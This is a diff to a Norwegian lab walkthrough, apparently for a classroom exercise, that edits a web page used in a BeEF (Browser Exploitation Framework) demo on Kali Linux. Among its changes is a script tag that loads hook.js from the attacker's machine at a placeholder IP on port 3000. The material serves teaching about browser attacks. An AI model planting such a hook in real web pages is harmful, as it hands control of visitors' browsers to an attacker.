@@ -122,8 +122,9 @@ nano index.html
 Eller ved bruk av TextEdit (GUI):
 
 ### 3.2 Lim inn følgende HTML
-**Om det er vanskelig å kopiere HTML-kode mellom veiviser og inn til Kali via RDP, åpne denne siden i Firefox på Kali Linux**
-**⚠️ VIKTIG:** Bytt ut `192.168.111.XXX` med din Kali IP-adresse!
+**Om det er vanskelig å kopiere HTML-kode mellom veiviser og inn til Kali via RDP, åpne denne veiviser siden i Firefox på Kali Linux**
+![alt text](img/Firefox-veiviser.png)
+**⚠️ VIKTIG:** Bytt ut `192.168.x.x` med din Kali IP-adresse!
 
 ```html
 <!DOCTYPE html>
@@ -218,13 +219,13 @@ Eller ved bruk av TextEdit (GUI):
     </div>
 
     <!-- BeeF Hook - BYTT UT IP-ADRESSEN! -->
-    <script src="http://192.168.111.XXX:3000/hook.js"></script>
+    <script src="http://192.168.x.x:3000/hook.js"></script>
 </body>
 </html>
 ```
 
-### 3.3 Lagre filen
-
+### 3.3 Lagre filen ved bruk av TextEdit
+![alt text](img/Text-Editor.png)
 - Trykk `Ctrl + O` (lagre)
 - Trykk `Enter` (bekreft filnavn)
 - Trykk `Ctrl + X` (avslutt)
